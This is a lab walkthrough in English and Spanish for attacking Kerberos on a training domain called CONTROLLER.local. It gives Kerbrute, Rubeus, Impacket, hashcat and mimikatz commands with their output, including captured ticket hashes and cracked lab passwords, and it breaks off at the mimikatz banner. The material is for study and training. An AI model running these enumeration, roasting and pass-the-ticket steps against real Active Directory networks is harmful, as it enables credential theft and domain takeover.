Kerbrute Installation - 

1.) Download a precompiled binary for your OS - https://github.com/ropnop/kerbrute/releases

2.) Rename kerbrute_linux_amd64 to kerbrute

3.) chmod +x kerbrute - make kerbrute executable

4.  sudo mv kerbrute /usr/local/bin




Enumerating Users w/ Kerbrute -

Enumerating users allows you to know which user accounts are on the target domain and which accounts could potentially be used to access the network.

1.) cd into the directory that you put Kerbrute

2.) Download the wordlist to enumerate with here

3.) ./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt - This will brute force user accounts from a domain controller using a supplied wordlis


https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/User.txt




./kerbrute userenum --dc CONTROLLER.local -d CONTROLLER.local User.txt



    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/05/25 - Ronnie Flathers @ropnop

2025/08/05 15:18:51 >  Using KDC(s):
2025/08/05 15:18:51 >  	CONTROLLER.local:88

2025/08/05 15:18:51 >  [+] VALID USERNAME:	 admin1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 administrator@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 admin2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 httpservice@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 machine1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 machine2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 sqlservice@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user1@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user2@CONTROLLER.local
2025/08/05 15:18:51 >  [+] VALID USERNAME:	 user3@CONTROLLER.local
2025/08/05 15:18:51 >  Done! Tested 100 usernames (10 valid) in 0.034 seconds
root@ip-10-201-12-168:~/Downloads/kerberos# 








# Rubeus es una potente herramienta para atacar Kerberos.

Rubeus cuenta con una amplia variedad de ataques y funciones que lo convierten en una herramienta muy versátil para atacar Kerberos. Algunas de estas herramientas y ataques incluyen el overpass hash, las solicitudes y renovaciones de tickets, la gestión de tickets, la extracción de tickets, la recolección de tickets, el pass the ticket, el asado de AS-REP y el asado de Kerberos.

La herramienta tiene demasiados ataques y funciones como para cubrirlos todos, así que solo cubriré los que considero más cruciales para comprender cómo atacar Kerberos. Sin embargo, les recomiendo investigar y aprender más sobre Rubeus y su amplia gama de ataques y funciones aquí: https://github.com/GhostPack/Rubeus



echo 10.201.3.6 CONTROLLER.local >> C:\Windows\System32\drivers\etc\hosts

Rubeus.exe harvest /interval:30


  User                  :  Administrator@CONTROLLER.LOCAL
  StartTime             :  8/5/2025 7:51:31 AM
  EndTime               :  8/5/2025 5:51:31 PM
  RenewTill             :  8/12/2025 7:51:31 AM
  Flags                 :  name_canonicalize, pre_authent, initial, renewable, forwardable
  Base64EncodedTicket



  User                  :  CONTROLLER-1$@CONTROLLER.LOCAL
  StartTime             :  8/5/2025 6:27:27 AM
  EndTime               :  8/5/2025 4:27:27 PM
  RenewTill             :  8/12/2025 6:27:27 AM
  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
  Base64EncodedTicket   :




Rubeus.exe brute /password:Password1 /noticke



C:\Users\Administrator\Downloads>Rubeus.exe brute /password:Password1 /noticke

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0

[-] Blocked/Disabled user => Guest
[-] Blocked/Disabled user => krbtgt
[+] STUPENDOUS => Machine1:Password1
[*] Saved TGT into Machine1.kirbi

[+] Done


C:\Users\Administrator\Downloads>




Username: Administrator 
Password: P@$$W0rd 
Domain: controller.local







Kerberoasting con Rubeus e Impacket
Kerberoasting permite a un usuario solicitar un ticket de servicio para cualquier servicio con un SPN registrado y luego usar ese ticket para descifrar la contraseña del servicio. Si el servicio tiene un SPN registrado, entonces puede ser Kerberoastable; sin embargo, el éxito del ataque depende de qué tan segura sea la contraseña y si es rastreable, así como de los privilegios de la cuenta de servicio pirateada







Rubeus.exe kerberoast


I have created a modified rockyou wordlist in order to speed up the process download it here 

https://github.com/Cryilllic/Active-Directory-Wordlists/blob/master/Pass.txt



[*] SamAccountName         : SQLService
[*] DistinguishedName      : CN=SQLService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/SQLService.CONTROLLER.local:30111
[*] PwdLastSet             : 5/25/2020 10:28:26 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*SQLService$CONTROLLER.local$CONTROLLER-1/SQLService.CONTROLLER.loca
                             l:30111*$A78255C111FBC3D4E75483798ED95BB8$974BA03992F16C78BBA7EFAF49A31D3B1A6474
                             7CFA45CEB62210EF4E8BE2B58D34E869877A372D2261D40FC13FF1CC52FC8659DD12774FD5B39018
                             BC0DFA6BFC19CFF96D85E30898865701AC41359101A6B0FA1A03FC0EDDEBCF64E8806E7D47A52EB7
                             1E03154B5191781D70BEAAE64848BD37AA606532E171BD7BE01F056D272D80E797E36E05B1FA54A9
                             4A2E3EA07EC4D9BC1F2D57AF87386FC012B170665A0765FD4082A9B6BDDEC7D892DE4B9983F19B9A
                             C01086E9AD7716BEDAF9B8D8E8F7F7BA20B24B3E89F61536BE3439B7B8CE7E42F8995B7D8FB6FB47
                             2A52D1FD5E73D189B21928D731A5F03D5C40ADFAAC305E7CD8B62A889571117FCC6D958180B3FC5C
                             4219B583B894ADB1A2BD7373AE0F559C4DEFD41017A621DC581478131985E76A7235A308AA498CFE
                             DA0D19ADA2B3230A1835DDB296B7C797531DF1872E27C36B76D1E73021D1D4F524D5ED317FE35121
                             AEE347027C3FB82026484A5CB30A14AC6D3B857048B04D8EFBA6B5B6D92587324EB3CD678BA1129B
                             622C35D3F5F991788BBC3480E4E455532994CC50237CAF128865B04DBF0F5431CF29A3BB0B7E1B5D
                             661F053996227382A1B5142920E41D8E88A2651E26CFAAF96A9F4C394525C97C8D3E59C579ACFEC7
                             14B36237C9869A4775543414F2DF3C8BB12261D9E953887287D7E569940DA8B7774813F9996ECED2
                             ACE793A18BBA2D3C78B6D38F6B024C4B5563B018D35A7D44D97836E294DEEC60975E3F73A308774C
                             D08C47EB1EB3B9E42DCEB566A9C56160D13C50D3128D688A895306855CEE3FB3EE7B3C821EA9080C
                             DD35499C92F74B5F96DEB5B052E19D3505F57A596F5B34B129094D8D61862DFB4F83659B151F017F
                             A57C964BCD0D636BE5CED0999B350B9CD97817024F18418749B29B0CC116A91E0DE30A47553EA6E2
                             0D1B296885990F34BCAE262EC1B93DE8AB2DD1E2379E8B76481197069C4C3E67F4E8EC975778C059
                             9E3CE0D82859173F977A1500F5077EB7847FC19E68D84FE0FBFC68EF40AC042FCD0877E8E16116F5
                             DD2AB902CC36EEEA56AEEFDB79BD308E5A7337F2B2DC93AD554DF42D1A1E235A70BF28A415CE33A7
                             BB6DF97DB1F2B1EDAECD80454E56997436111739624DE60F89AC001FE6558A69104F84DC84C768FF
                             052DB8A4DE7612B0AECE12ABDFB450C1E670C167EACB62BEC23330B9AF6DCFC0E79F7F86CB0C2E31
                             214D9264747F878B366CFEBB2F3A5A82283BFA087D7880270181DAACBADA000668FB4D72FD77F161
                             C7FE7292F91ED6FB91E83DB1CFE80C4A6B19FAB1887648173B7DDD7B34B60F4CB75975603ADFABE3
                             8710649E4053895F3873F913A098EDD1A76FC6DD9B5C4508346DD251C9C5E1ABD36DBF346CFA0828
                             304F8FEE66C034EE71EABF330EBB2B5237EA5C182BD46F453365C0CC455FFBD5D37AB095C095C174
                             1C49E67DFF3D8DF6C1967986E5293C6F8C65C204EF53968D9941284A574DFAA61DA0F23D6F24FDCE
                             7C6DEF2A2FFC0E97B7ED1D86741DA40F0A7409AC760BA352640253717DA0043E13E80DE15C96DFAE
                             26B7A75E36A0B9C745A3AABBA574DD5FDFD5B5A84E70A54F7F17BA566262173DC1E0895DBCBC6C3D
                             2EA46B09560C4F3A2FDB64277800BBF02006029CC823E0371C37EB7FFF


[*] SamAccountName         : HTTPService
[*] DistinguishedName      : CN=HTTPService,CN=Users,DC=CONTROLLER,DC=local
[*] ServicePrincipalName   : CONTROLLER-1/HTTPService.CONTROLLER.local:30222
[*] PwdLastSet             : 5/25/2020 10:39:17 PM
[*] Supported ETypes       : RC4_HMAC_DEFAULT
[*] Hash                   : $krb5tgs$23$*HTTPService$CONTROLLER.local$CONTROLLER-1/HTTPService.CONTROLLER.lo
                             cal:30222*$2255FC2FB9D0F43CEDE5424884B6167C$2367FF4299DC7A7CFAE9D39244E28D394D64
                             A08EAD8FB00926CE192AFF9EFC2B45BE346B25BF912A946B8EC58DE45600FB9DA46B47343F09400D
                             E458C636E6E61390C16AB51A9DA19F24C604EFA9CEA311398C5E8616AB9423EDB958138E211F9B47
                             85228B2FA4DA84B914C8B83F3FEEAA10BB06CE6DDD95EC1C239FC2C0AAEBB1FB221968537159899F
                             887AFC8364060A978B43A62F56549831A8933C76CC24AA33A5CEE97BBA9B5262025441FCA1373F55
                             8FD909FCA5897368E196D01EFD3446F2B7095DEBCB9E076478A2B4B3321AAFE0156701688F619E57
                             4BC1612CB3E9F2F5DDFD404293A445B37CEF7B302557429589E09162A78B119256BBCE6D077C215C
                             809BA2531EC07A40E7C643F61DEC3A01728B7DB549ABE3DBDBDF4899D7EDF21AF7773A9E21056D96
                             17D9326241D960416798DF0D149BDE89A100A7C1B5B569960ED9D772FE62311960A264339100AD36
                             7E2DA6C52198BD9317A3889D217F301003D3084365C5C5F7A2D9521A7802DD290B9A43C183564BCD
                             CCFBFFAD87165BF17087FBFB5D997C95C70402E08DB3BD517748A3A096988DD7C55DD475738C3FF0
                             D4BCCD4680F25EBDFBAD4E27D0A6C4016A34A8D64372D5B837433F152C006700D7E951DCDA35262F
                             2EA45A18CE49800D545663EDB7F8C5A76DF0E14EAA1D0A4110A9B8CAF6BF8631892FB2EA248D6BAF
                             071DE1AFE6DD7F20F667861E619FD94EC757D6D54280E85709186432320813E6D9CB0FE613803254
                             861BE3858C835576DAA9487F8AC0D03D62FD231FD895096F5ED12B071792ADD2DDC236577D878C49
                             76AEEBB254F0818A53D27B5BABDBAC6A445464A5F34BEC58341D64E0A15EB3293EACDD82D5392174
                             44BE28F6E34180EE82A5A1346984616A2C5BB3B379A1656B2ECC77EFBA54842749765D5F12289EDC
                             FC1E9CB61A44CE6562D993FCD3C7189728B1619170707AB02152E43C830A93E66695BA38B79CBDF9
                             0B43BAC2AF09BA26BAC2CBA352D3F88535F5DA617B5132CF1D844C81F8FCED013C6EA43802CAEC86
                             6A3901538FEEEA725662C417D1D7366E3D4EE30EFDD5CED3678CE0A8BFF6BF044BEC3AFC7FA042E1
                             BE855DDE3E5EE4678032A3341BE36FFA7BB2968A8FFD5960FDCC2D9CA1F4540179D985E61C664B7D
                             D0B057D19668A70BA8FCC1B757238D86AC2855228936992155E08E3EC5F2BC245E27715BB687F148
                             AF4907AB375559409F1CDFE1FF23C88388BB2A3B28F8C6435C62E5CF682511046DAA2FBCFC06678B
                             AC20F9994EDB618DF267EE218F3149C7B0F295A98066177210E3FF5FEC4403A51C45B4FE9FEE048B
                             AB860868F2357B8CCABF7ACA6A62278B36C8E4FDCF4A49235FC739548F44FB9E941A6746CC90F495
                             720C63869677FF161D2E84C384AC0AB387F0C9E344A576052D479DC747466A698802DD83EC63A4A9
                             6C61C33C1BC90D08FD19414C28CD88A5AB1CB616C4317DE348DD4DA7F64133BB2192137C2D90310A
                             A7423EA436A67F1BC86C5369D1FA36516749C27BD298B7888989080FB21DBAE9D658EF956388DC9D
                             734A0FFB6EACF08860B2843661C1FD6305DCE3AB7C6269D3F352A2A8FDF19B3080B64D4987F6516F
                             C5FE2799AAAB084CE35DB645BA5D74A93D24F4F4B551AC93BD54FD3FE2E5


C:\Users\Administrator\Downloads>





──(kali㉿kali)-[~/Downloads/kerberos]
└─$ ls
hash2.txt  hash.txt  kerbrute  Pass.txt  scan.txt  User.txt
                                                                                
┌──(kali㉿kali)-[~/Downloads/kerberos]
└─$ 

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash











# Method 2 - Impacket

Impacket Installation - 

Impacket releases have been unstable since 0.9.20 I suggest getting an installation of Impacket < 0.9.20

1.) cd /opt navigate to your preferred directory to save tools in 

2.) download the precompiled package from https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19


sudo unzip impacket-impacket_0_9_19.zip -d /opt





3.) cd Impacket-0.9.19 navigate to the impacket directory

4.)          pip install .

 - this will install all needed dependencies

# Kerberoasting w/ Impacket - 

1.) cd /usr/share/doc/python3-impacket/examples/ - navigate to where GetUserSPNs.py is located

2.) sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.3.6 -request - this will dump the Kerberos hash for all kerberoastable accounts it can find on the target domain just like Rubeus does; however, this does not have to be on the targets machine and can be done remotely.

3.) hashcat -m 13100 -a 0 hash.txt Pass.txt - now crack that hash


sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.3.6 -request










# Download impacket from here:
https://github.com/SecureAuthCorp/impacket/releases/tag/impacket_0_9_19
# Unpack
tar -xf impacket.tar.gz
# Installation
cd impacket 
pip install .
# Running the tool
sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip [Target IP] -request









# Roasting AS-REP -

Durante la preautenticación, el hash del usuario se utilizará para cifrar una marca de tiempo que el controlador de dominio intentará descifrar para validar que se esté utilizando el hash correcto y que no se esté reproduciendo una solicitud anterior. Tras validar la marca de tiempo, el KDC emitirá un TGT para el usuario. Si la preautenticación está deshabilitada, se pueden solicitar datos de autenticación para cualquier usuario y el KDC devolverá un TGT cifrado que se puede descifrar sin conexión, ya que el KDC omite el paso de validar que el usuario sea realmente quien dice ser.



1.) cd Descargas: navega al directorio donde se encuentra Rubeus.

2.) Rubeus.exe asreproast: ejecuta el comando AS-REP roast en busca de usuarios vulnerables y luego volca los hashes encontrados.









$ python3  GetNPUsers.py -usersfile /home/kali/Downloads/kerberos/userK.txt -no-pass CONTROLLER.local/
Impacket v0.11.0 - Copyright 2023 Fortra

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User Machine1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Machine2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Admin1 doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$Admin2@CONTROLLER.LOCAL:ccd6aa0e219d14f9ff79dd3a7cb6e4fa$acbc76a88368b945f912f56ed7e77a870faea355ab5a2b98d5bff92d62fd8718723114d0f2d94d070bc2c296111ad47b13cc0cfbd17153e215082af5e2470334933681d07fdd40fde2c6707b7e411dd2b33a9951a54dd48660a06b0f8c1ed0622ea62d9ee38d64de1aa4c25138168f6bf5c907feb9e8d38483b735bf112b027bdffa4365b644fac9c52aac4b8809bba29f5e8ddee6065aef1c489ff54326c7864e610df50d6fbc5d7bc901a004f0be94cdcbc979fb849423e0e218b031d7b318d5216de23e8b96fa678b9e468b1b212dc03956324f9150c516ce09a7ff387ab79d29b8d102c5910777443e3ab3f5aae2b189cd6f
[-] User User1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User User2 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User SQLService doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$User3@CONTROLLER.LOCAL:de68f7ddf0afdefd1da370343fdba3a8$3081a0231cf3b290de4c2ee1722bef56f84d182a3463311a6441e1cfe1db4d788a3275cb4d752a28de8a977466f10e73681c65cfdeefba7b6baf30a3ebb6a50b384bad6e4d2b917afb89a7d79ad90d9745ca7e9403530738a9160c450fb0132dfee20eefbd242530e2783f204404cc84ef2933b80dc7c0b9773ecd9610d5e1aa1627771a17394c3fc74806052b86c1448f69abf79cfb02dfac3c52d168f53e72b363c7aaf9e70bc8b2b520e5b8184542404c821e784f005a312a58a390f7b4f7f0ac9373c444a01ce185efe4fdb777556127490e54c2f5eff5c70cc819d04cefbf86f36526625cba3a30cfaadb6c628e22ddef1f
[-] User HTTPService doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sshd doesn't have UF_DONT_REQUIRE_PREAUTH set




What is the HTTPService Password?

Ans: Summer2020

What is the SQLService Password?

Ans: MYPassword123#








──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ python3  GetUserSPNs.py CONTROLLER.local/Administrator:'P@$$W0rd'
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             



                                                                                                                                                      
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ 


┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
└─$ sudo python3 GetUserSPNs.py controller.local/Machine1:Password1 -dc-ip 10.201.123.47 -request
Impacket v0.11.0 - Copyright 2023 Fortra

ServicePrincipalName                             Name         MemberOf                                                         PasswordLastSet             LastLogon                   Delegation 
-----------------------------------------------  -----------  ---------------------------------------------------------------  --------------------------  --------------------------  ----------
CONTROLLER-1/SQLService.CONTROLLER.local:30111   SQLService   CN=Group Policy Creator Owners,OU=Groups,DC=CONTROLLER,DC=local  2020-05-25 18:28:26.922527  2020-05-25 18:46:42.467441             
CONTROLLER-1/HTTPService.CONTROLLER.local:30222  HTTPService                                                                   2020-05-25 18:39:17.578393  2020-05-25 18:40:14.671872             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*SQLService$CONTROLLER.LOCAL$controller.local/SQLService*$03da0bfe99b793308e2d80d1c47c1ed6$9e36b3c558916072c50106a64e1a62eb15faf881652532a6f97839712de7f383e92c03289222b25dbf96e0fe7a0d82b0a6e734c00568ff16af28defcc4a5f1bc92e21d15a5f52478007f781f6ad2809d18ae1e5772b310f55b4a74eea86afe6d0cbb228f57198a341c8a57e6ea0931ec16f29b141e7fd9b474217aefb155205a643735ccdafbd394c79935b4fb2783fa78a6923d1d6f202f5b68cfafe691c5b294dc88b0dd5de02dfcc278390ec050b25ecf5d8383439ba87747939c7faec58788c35372d61d95f9a0ea3d56ce2a5fd8f2bf0d5b951d8683941a7606c23da29c61a99ce3994c714a3aa69e5b1133a1b4693a8b2a08f52b514cc741b44aca083d0496a34990f91a34cc239eb90a99d3e37aafce9557961d58773af0dba2ac8cadfa61b2e0b2c1d88ff073bf003d80e682dc43006699d712d36dc13f6c63e29078fdb0d3039a5fcddff65592d54bc900b76e000503692c3031f044d5d298d06a2f116b1e72f0d79150096a8fc175a3ae2711b1a0203cc46cd97f9915bdc6b19ce47a92414df15e8fce906550f7123ac5ee0689ed3563ec0379a3285ef018fe5a92800c3542c7a788a8a4467d8aec908194e01c88495eb82789893e5e67d40e5d57ffc1b6eab628ff9c2315b170c43f59646fd79c59833a6ba22d8cc96e14a97ca6c1ee9cace436be1a8378841a13cc20604c55c150c9d0a9603ade32f18f6d91cacb98de8acfa518a804fb02e4f184ac4e23138c1669dfc9677dcbb57feb5bc5fd73cea8b65ed36a544b18546e952493a641c1316233ecc4199852e4316d322595937f9921d7c9985d181a00bc8878714f18c6269f581efcc3feed2f4c7bf92c03c6021fa60c728030351619ffb09d72e9406550a8c791e0cac6d50524099e5b7cd60b6ce3e03303752ecf4320007fa2bd4ff63b66b7f0e076432ab2e6c3fefd216279feb62579c269eca53a9e743d529f09a9694bac1fd356c5fe8e0d7762d0c54b6ce790233593970bd6286a7f9f3e8996849d1c3acade26d69b5365e59917fc44467bf88597062f4873391c15142fb3ae61835e5840740bed38be9f87e5510df9df5087b2be390e627ed031448fa169534af146195158f869072cd2384158e41f9ea83eb073a8e9621c36cb30a7fffd7c62d7ba5f72c42c56ec1fa89b28f2a42672c43428a3d1ac3a4c16758175d6d26b1627a76011e2979e200db2b05aab457dab9d80dc31cc42977bbe73eb794589b00c942d946c3a565ffcc5d9d938c1901b1ea3d38096e7f010178d1e482961ca37f08f6c2eb6b8e4f73c49ddefe1bd0d377d1c29ef44d208a8ef436562750799612501fa0f2643a6c2844a3fea570f7bed47faa162a129843a321a70581dc2db3a
$krb5tgs$23$*HTTPService$CONTROLLER.LOCAL$controller.local/HTTPService*$52e8b66e7a0dfa2ac27feb6bc09884e1$fe4d5378dba400c78a5feb04d3f9bce81e094c3ba30ed0aca6fc10996b8e6e500b246060f5b3059da4047b5d41281072c8ac77ccb653c8299d9469ea2f58f4822c5c81081f71083be7063b2f1670d72c7408e823f634a55b99131cd29f68cb5f06a681f6c9d7f336dafa76e7e4ec0ac737451784dcfad7c2989e1eeeb159746388f8f3353e86179ab4c73a2301bc5957aa7eee181d98f037c57aee6fa5624e8941dd0daeeafe529e396f306807f3ba5de3c6ce20b6e14a8ae4eb78392321725918097f937f5d9b2ffcefa86419e6765619e4c0308fbf955f067fd60611ce64a898773179a7e0abe21673e798bdbdb42d642ab73f706e562b4d4f3884aa0b74c15b7dfed59a3bc750b87b8f03a0c2eb2a42cc76566a96da8cb40294fe49c5741d26410912afdaae9ae69db51c059e032cde2801eb6f360b2bf813147494d2dfd0dfe8fc5bde7d5dc14fe5b3f6d6abdd64805bc8eca50b5759f93b8a854bc9864a6cc293acbe860de9c67351aba28b0bc37713e725e972b001eb70cb214fd7d14865045aa78e30e3d9143def4faa5a8378b8c28177e36e3df79486a87614a5c1f70bee9993c4b716f11856949c065f5af5e0e63c4f5fccd79ce0b2a60e8daef09bca68a265a22a3d68fdaf6808d5abe4dfb416f73992c15d6a88261c1298908ac5dec7247721452e78883dd42d1a7648435916bf6e203f23a8df6d8c1f6ab6fb8d9e621d4fd7e380ccbaa0d537b46b926a335bc1bb2741c12d34bac482c2f7582b9b1e1c6cbc8863a41e9eedcbeb9ed8dd4eaf95851783dccd03130d6c7f82fdf19a1571b3cd8b21191dc73d6883ca3f3f798ea7ace2578e3b31c6ad2faa5e21eabd28c7e0e301683aa5b3de22cf5c6343940518fd45509624f9f8fbf7260d4e6b9b0ec9e815fb934a3aaf3e3fb1717ce4b55279be422ce65ed3a1f26f65d16e061b1f46fa972cb76caa288419301c141f748ed37bed121d96ff5f9f8dee9fd05f2f147f2c0a766646d773e5b126842eba4e82f73702a1ef43573bcaa886b5cdf270746a8ea0bae2dfb42a14a544b606c67c7e1394fcc334e011d1ccd4b1ce093c1c07a62a7db2ec7d3f543bc205a9a20f1d1d23343730dda13ce8ba458c8891b5652d9eabf423796a084a31ab98b8172d5a0438b044b909c282b0fddf1c9d6d434fb7b63660af2768b998763b3b0cba650282e6283aef6394b82efc2580bfa50228a2f3ea6458f815929348129746a1e295d373ac88768088655ed324b161a767f12425f41b62e7da2e8b8d5c2661114b9419aac3819f3b020b428eaeddb02efb84fca8f4a15544271708b6b829a4d4905072b92b5a84ad1ee58465569c7c551c830dfa9481da8d6dea8a78673c80a086bb
                                                                                                                                                      
┌──(kali㉿kali)-[/usr/share/doc/python3-impacket/examples]
















hashcat -m 13100 -a 0 hash1.txt Pass.txt
hashcat -m 13100 -a 0 hash2.txt Pass.txt



Hashcat Results :

SQLService: MYPassword123#
HTTP Service: summer2020

Method 2 — Impacket








# Diferencia entre AS-REP Roasting y Kerberoasting

Ambos son ataques contra Kerberos, pero apuntan a diferentes partes del protocolo y requieren condiciones distintas.

| Aspecto           | AS-REP Roasting                                                                 | Kerberoasting                                                       |
|-------------------|----------------------------------------------------------------------------------|----------------------------------------------------------------------|
| **Objetivo**       | Usuarios con "Pre-authentication" deshabilitada (raro).                         | Cuentas de servicio (SPNs) con contraseñas débiles.                 |
| **Cuándo ocurre**  | Durante la primera autenticación (TGT request).                                 | Al solicitar un TGS (Ticket Granting Service).                      |
| **Requisitos**     | Usuario con `DONT_REQ_PREAUTH` en Active Directory.                             | Cualquier usuario autenticado puede realizar el ataque.             |
| **Hash obtenido**  | `krb5asrep` (AES o RC4).                                                        | `krb5tgs` (RC4, a veces AES).                                       |
| **Herramientas comunes** | Rubeus, `impacket-GetNPUsers`.                                                | Rubeus, `impacket-GetUserSPNs`, Hashcat.                            |
| **Ejemplo de comando** | `GetNPUsers.py dominio/usuario -no-pass`                                      | `GetUserSPNs.py dominio/usuario -request`                           |
| **Mitigación**     | Habilitar Kerberos Pre-Authentication para todos los usuarios.                  | Usar contraseñas fuertes en cuentas de servicio.                    |










AS-REP Roasting w/ Rubeus



*Evil-WinRM* PS C:\Users\Administrator\Downloads> ./Rubeus.exe asreproast

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v1.5.0


[*] Action: AS-REP roasting

[*] Target Domain          : CONTROLLER.local

[*] Searching path 'LDAP://CONTROLLER-1.CONTROLLER.local/DC=CONTROLLER,DC=local' for AS-REP roastable users
[*] SamAccountName         : Admin2
[*] DistinguishedName      : CN=Admin-2,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::99de:3101:5b65:765c%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\Admin2'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$Admin2@CONTROLLER.local:E78E01444D48BF0DBE6D6C877A7F931E$C9AC212AEDD4
      3E32F2CFD41B0143FD458FF4F3DD404D8F2127E63136CCA55FFD3E7969D831D29E00EC09F3507C97
      85E49540A29A7334171AB80734E7815AA37B88FB89DEE3EA386271571A154E8E36B9CD8E411CC7FC
      BA729FC7246CACDA994D1C29D8A25EF2B43DBE501093A74251A6FE8F7C9B25B0CC101941540C6005
      A86A88A992B6727EB0190C651AC01CA69E595AEEACEEFD9685847DD0D3F095C449BB48ED2E7F2AFF
      6D015261CE9D8BCFCC556B3652057EA00BD60113162D159D4BD87AC2878343F6661D4A1C3D5C6027
      6448FF990488986E8AB50011CEFD3639A8C01CAEB4E4721A4D0F6582C9D1B9E706E993ABC142

[*] SamAccountName         : User3
[*] DistinguishedName      : CN=User-3,CN=Users,DC=CONTROLLER,DC=local
[*] Using domain controller: CONTROLLER-1.CONTROLLER.local (fe80::99de:3101:5b65:765c%5)
[*] Building AS-REQ (w/o preauth) for: 'CONTROLLER.local\User3'
[+] AS-REQ w/o preauth successful!
[*] AS-REP hash:

      $krb5asrep$User3@CONTROLLER.local:E9040C12F65C0A7E0B4506F6D3F963AF$A2B7236AD0F6E
      7EA42EE53FE8B7C0C840731899C0832EBD743B8CE996D26CBB1B024813CE0CCA7B864FF0869D387F
      445F0178EE948F67BD4D1441270077770CAE83361153AC8D92D965463B8B4846F806C7DFEB43848E
      E66E04A392154536EC666F937B071DC117E1842EFE4B5B3FBAD85C5DC6B6C9017D5EA1D9244D8DB6
      69AD2B1EF7B8141E05738061EB0A567F073939723F310909E6C273D6D7E82C62CDD1B27DD2DBFE9B
      FD5E793AA8E02BDE982F0CDD52B168560D063AD8AE5F2F738DCBB240BC1FB7E55C5CC093144CE55E
      5F898300FF938DF61BE8D7D5ECED65D968DD1EAA1C1BAE87677591A9B41EAC20D7BD4AFA91F

*Evil-WinRM* PS C:\Users\Administrator\Downloads> 





hashcat -m 18200 Hash1.txt Pass.txt 
# P@$$W0rd2  
hashcat -m 18200 Hash2.txt Pass.txt 
# Password3








# Mimikatz es una herramienta de postexplotación muy popular y potente, comúnmente utilizada para volcar credenciales de usuario dentro de una red de Active Directory. Sin embargo, usaremos mimikatz para volcar un TGT desde la memoria LSASS.




cd Downloads 
mimikatz.exe 
# for getting tickets from the lsass memory  

privilege::debug


securelsa::ticket /export 


#this will export all of the .kirbi tickets into the directory that you are currently inAt this step you can also use the base 64 encoded tickets from Rubeus that we harvested earlier
# first lets list all the keys obtained :  
# exit the mimikatz and dir  
We will see only one Administrator key : [0;6ec6c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi
# Lets pass this ticket  
# run mimikatz again
# Now enter this command to it will cache and impersonate the other ticket
# Syntax : kerberos::ptt <ticket>


kerberos::ptt [0;6ec6c]-2-0-40e10000-Administrator@krbtgt-CONTROLLER.LOCAL.kirbi









(c) 2018 Microsoft Corporation. All rights reserved.

C:\Users\Administrator>cd Downloads

C:\Users\Administrator\Downloads>mimikatz.exe

  .#####.   mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
